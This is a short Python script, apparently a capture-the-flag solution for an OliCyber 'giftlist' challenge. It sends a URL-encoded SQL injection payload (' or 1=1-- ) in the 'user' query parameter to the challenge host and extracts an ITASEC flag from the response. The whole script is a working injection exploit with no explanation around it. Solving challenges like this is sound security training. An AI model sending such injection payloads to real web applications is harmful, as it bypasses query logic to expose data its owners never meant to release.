import requests, re

URL = 'http://giftlist.challs.olicyber.it/get?user=%27%20or%201%3D1--%20'
r = requests.get(URL)

match = re.search(r'ITASEC\{.*?\}', r.text)
if match:
    print(match.group(0))
